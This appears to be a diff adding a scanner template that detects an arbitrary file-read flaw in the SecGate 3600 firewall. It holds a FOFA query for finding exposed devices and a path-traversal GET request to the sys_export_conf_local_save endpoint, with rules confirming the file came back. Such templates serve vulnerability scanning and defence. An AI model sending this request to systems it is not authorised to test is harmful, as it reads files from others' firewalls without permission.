@@ -1,0 +1,22 @@
+id: secworld-secgate3600-obj-area-export-save-fileread
+
+info:
+  name: 网神SecGate 3600 防火墙 obj_area_export_save 任意文件读取
+  author: Observer
+  severity: high
+  verified: true
+  description: |
+    FOFA: fid="1Lh1LHi6yfkhiO83I59AYg=="
+  tags: secworld,fileread
+  created: 2023/12/07
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /?g=sys_export_conf_local_save&file_name=../modules/system/import_export.mds
+    expression: |
+      response.status == 200 && 
+      response.headers['content-type'].contains('application/octet-stream') && 
+      response.headers['content-disposition'].contains('modules/system/import_export.mds')
+expression: r0()
